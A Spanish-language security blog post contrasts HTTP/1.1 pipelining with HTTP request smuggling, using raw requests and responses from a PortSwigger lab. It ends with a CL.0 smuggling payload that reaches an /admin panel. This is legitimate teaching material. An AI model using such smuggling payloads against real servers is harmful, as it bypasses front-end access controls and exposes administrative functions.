---
layout: post  
title: "HTTP Pipelining vs HTTP Request Smuggling"  
date: 2025-08-12  
lang: es  
excerpt: "Exploramos cómo funciona el HTTP Pipelining y cómo diferenciarse de Request Smuggling."  
---

> Hace poco [James Kettle](https://www.linkedin.com/in/james-kettle-albinowax/) sacudió el mundo con el descubrimiento del famoso 0.CL, un tipo de request smuggling que ha puesto en jaque a HTTP/1.1. Tanto que se ha creado [HTTPS/1.1mustdie](https://portswigger.net/research/http1-must-die) para que entre todos logremos enterrar esta versión obsoleta y peligrosa.
> Este conjunto de posts es mi granito de arena para ese movimiento. La idea es que entendamos bien qué está pasando, para poder seguir peleando juntos por un internet más seguro.

> #HTTP1.1MustDie.

En este post intentaremos diferencias entre solicitudes legitimas pertenecientes a HTTP Pipelining de un ataque HTTP Request Smuggling, esa delgada linea.

# ¿Qué es HTTP Pipelining?

HTTP/1.1 permite mandar varias peticiones seguidas sin esperar la respuesta de cada una. Después, el servidor responde en el mismo orden que recibió las peticiones. Esto hace que las páginas carguen más rápido ya que no tienes que esperar tiempo entre peticiones.

## Funcionamiento Básico

1. Cliente abre una conexión TCP.  
2. Envía varias peticiones HTTP secuenciales, sin esperar respuesta.  
3. El servidor procesa las peticiones en orden y responde en el mismo orden.

**Ejemplo básico:**

```http
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n
GET /robots.txt HTTP/1.1\r\n  
Host: example.com\r\n
\r\n
```

El servidor responde primero a `/index.html` y luego a `/robots.txt`, en ese orden.


## TCP: La Clave del Pipelining

HTTP funciona sobre TCP, que es un flujo continuo de bytes. No existen "mensajes" o "cortes" en TCP. El servidor HTTP debe interpretar manualmente dónde terminan los headers, el cuerpo y la petición completa.

Una petición HTTP está compuesta por:

- Línea de inicio: `GET / HTTP/1.1`. Es básicamente decir qué quieres, de dónde y con qué versión de HTTP.  
- Headers: el tipo de contenido o cookies. Se separan del resto con una línea vacía (`\r\n`). Esa línea vacía es como decir “ya acabé de dar instrucciones”. 
- Cuerpo: opcional, y solo va si mandas dato  

## Interpretación Precisa del Servidor

> Usaremos como laboratorio de pruebas el reto **CL.0** de PortSwigger, perfecto para ver la difernecia entre pipelining y una petición contrabandeada.  
> [Ver laboratorio CL.0](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)


Ya que sabemos como debería estructurarse, vayamos a como lo interpreta el servidor. 
Solo puede empezar a procesar la petición cuando tiene:

- Todos los headers (terminados en `\r\n\r\n`)  
- Todo el cuerpo (según `Content-Length` o `Transfer-Encoding: chunked`)  

Si algo no cuadra, el servidor se queda esperando más bytes en el flujo TCP.

## Content-Length más largo: Cuando el servidor se queda esperando bytes fantasma

Request 1:
```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 400\r\n
\r\n
POST /X HTTP/1.1\r\n
Host: 0a97003f046e22ef80f9df5000cb00ee.web-security-academy.net\r\n
\r\n
```

Aquí le decimos al servidor: "Oye, te voy a mandar 400 bytes".
Pero en realidad… solo le damos *85* bytes. Faltan 315.

Al no recibir lo prometido, aguanta hasta que salte el timeout, y entonces…

Response 1:
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Keep-Alive: timeout=10
Content-Length: 24

{"error":"Read timeout"}
```

## Content-Length más corto: cuando lo que sobra rompe la siguiente petición

Para este ejemplo usaremos dos peticiones enviadas en la misma conexión.

Sigamos profundizando en Pipelining

Request 1:

```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: Keep-alive\r\n
Content-Length: 28\r\n
\r\n
POST /X HTTP/1.1\r\n
X-Ignore: X
```

Request 2:
```http
GET / HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
\r\n
```
¿Qué esperamos?
Que la segunda petición falle.
Nos fijaremos en su respuesta:

Response 1: 
```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
...
```

Response 2:
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=10
Content-Length: 47

"Frontend only accepts methods GET, POST, HEAD"
```

¿Por qué pasa esto?
Gracias al pipelining.
El servidor lee exactamente 28 bytes para la primera petición. Eso incluye `X-Ignore: ` pero se queda justo antes de la “`X`” final.

Lo que sobra se queda en el buffer y se usa como inicio de la siguiente petición, quedando así:


Request 1: 
```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: Keep-alive\r\n
Content-Length: 28\r\n
\r\n
POST /X HTTP/1.1\r\n
X-Ignore:
```

Request 2:
```http
XGET / HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
\r\n
```
Pero claro… `XGET` no es un método HTTP válido, así que el servidor responde con un `Frontend only accepts methods GET, POST, HEAD`.


## Content-Length: 0 , confusión con HTTP Request Smuggling

En este ejemplo vamos a hacer una petición con `Content-Length: 0`, que a simple vista parece inofensiva… pero ojo, que puede confundir y parecer un caso de contrabando de peticiones tipo CL.0.

Request 1:
```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: Keep-alive\r\n
Content-Length: 0\r\n
\r\n
POST /X HTTP/1.1\r\n
X-Ignore: X
```
Request 2:
```http
XGET / HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
\r\n
```

¿Qué pasa con la respuesta?
Según lo que vemos, `XGET` debería dar error, igual que en el ejemplo anterior, ¿no? Pues no:

Response 1:
```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
...
```

Response 2:
```http
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=utf-8
Set-Cookie: session=7KPckng5zUEuuf9uJwiIwOyycE9n7JTg; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 20

<p>Not Found: /X</p>
```

¿Por qué un `404` y no un `400`?
Aquí la magia está en cómo el servidor interpreta el `Content-Length: 0` y lo que queda en el buffer.

Lo que el servidor realmente ve es esto:

Request 1:
```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: Keep-alive\r\n
Content-Length: 0\r\n
\r\n
```

Request 2 (lo que queda en el buffer junto con la siguiente petición):

```http
POST /X HTTP/1.1\r\n
X-Ignore: XXGET / HTTP/1.1\r\n
Host: 0a4600d204a0636b805603eb009a00a8.web-security-academy.net\r\n
\r\n
```

O sea, la parte que quedó en el buffer (de la petición 1) se une a la segunda, creando una petición compuesta que apunta a `/X` con una cabecera extraña `X-Ignore: XXGET / HTTP/1.1`.

¿Confuso? Sí, pero es normal.

Aunque suene raro, esto sigue siendo un comportamiento esperado del pipelining.
El servidor simplemente procesa lo que recibe según el `Content-Length`, y lo que sobra pasa a la siguiente petición, a veces mezclándose de formas que parecen locas.



## HTTP Request Smuggling: cuando el servidor se confunde (y tú ganas)

Hasta ahora hemos visto ejemplos de pipelining que, aunque curiosos, son comportamientos normales dentro del protocolo.
Pero aquí ya entramos en otro terreno: HTTP Request Smuggling.

Esto no es algo que el servidor “espere” que pase. Aquí jugamos con las discrepancias entre el frontend y el backend para colar peticiones que no deberían estar ahí.

Este ataque lo popularizó **[James Kettle](https://www.linkedin.com/in/james-kettle-albinowax/)**
 con un estudio brutal que mostró cómo, con un poco de creatividad, podías engañar a dos servidores que hablan entre sí para que uno procese algo distinto de lo que el otro cree que enviaste.

En este caso vamos a ver un ejemplo de tipo CL.0.

Request 1:
```http
POST /resources/images/avatarDefault.svg HTTP/1.1\r\n
Host: 0aaf00fc04369b408159178a00b00064.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: Keep-alive\r\n
Content-Length: 33\r\n
\r\n
POST /admin HTTP/1.1\r\n
X-Ignore: X\
```
Request 2:
```http
GET / HTTP/1.1\r\n
Host: 0aaf00fc04369b408159178a00b00064.web-security-academy.net\r\n
\r\n
```

Lo que esperaríamos
Si nos guiamos por lo aprendido con pipelining, el `Content-Length: 33` de la primera petición cubre todo lo que enviamos, así que no debería quedar nada en el buffer para la segunda.
En teoría, la segunda petición (`GET /`) debería responder con el index normal de siempre.


Response 1:
```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
...
```
Response 2:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=mhK0zqJBVjLAdM8wIoIdB4zc5DxM7FMj; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 3064

...
<section>
  <h1>Users</h1>
  <div>
     <span>wiener - </span>
     <a href="/admin/delete?username=wiener">Delete</a>
  </div>
  <div>
     <span>carlos - </span>
     <a href="/admin/delete?username=carlos">Delete</a>
  </div>
</section>
...
```

Increible verdad? El servidor nos acaba sirviendo el panel de administración.
Nada de index, nada de contenido público. Acceso directo a /admin.

¿Por qué ocurre?
Aquí ya no estamos viendo el comportamiento esperado de pipelining.
Estamos explotando una diferencia de interpretación entre el frontend y el backend.
Uno cree que la petición termina en un punto, el otro piensa que sigue… y en esa zona gris, metemos nuestra petición maliciosa que se cuela hasta el backend sin filtros.

Esto es justo la esencia del HTTP Request Smuggling: colar requests ocultos gracias a esas discrepancias.

> Si quieres practicar este ataque, PortSwigger tiene un laboratorio increíble:
> [Ver laboratorio CL.0](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)
> Es oro puro para ver esto en acción.

En un próximo post entraré a fondo en cómo funciona el CL.0 y por qué provoca este comportamiento.
Pero por ahora, nos quedamos con la idea clave: pipelining es comportamiento esperado; request smuggling es engañar al servidor para que haga algo que no debería.

Espero haber podido explicar de forma clara y visual — que es como mejor entiendo yo las cosas — la diferencia fundamental entre el pipelining (un comportamiento normal y esperado) y el HTTP Request Smuggling, que ya es otra liga, donde se juega con las diferencias entre servidores para colar peticiones ocultas.

Si te ha molado y quieres profundizar, en los siguientes post andare jugando con HTTP Request Smuggling y otras vulnerabilidades. ¡Nos vemos ahí para seguir hackeando la web juntos! 💪
